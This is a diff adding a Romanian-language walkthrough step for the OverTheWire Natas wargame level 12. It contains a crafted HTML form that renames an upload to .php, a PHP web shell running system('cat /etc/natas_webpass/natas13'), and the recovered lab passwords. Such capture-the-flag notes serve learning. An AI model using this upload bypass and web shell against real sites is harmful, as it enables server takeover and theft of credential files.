@@ -70,4 +70,22 @@ PAROLA: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
 
 LEVEL_11: http://natas12.natas.labs.overthewire.org natas12 YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
 
+Deschidem o pagina html cu:
+<form enctype="multipart/form-data" action="http://natas12.natas.labs.overthewire.org/index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="natas12_getpass.php" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+</body>
+</html>
+Upload la un .php cu:
+<?php 
+system("cat /etc/natas_webpass/natas13"); 
+?>
+PAROLA: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+
+LEVEL_12: http://natas13.natas.labs.overthewire.org natas13 lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+
 
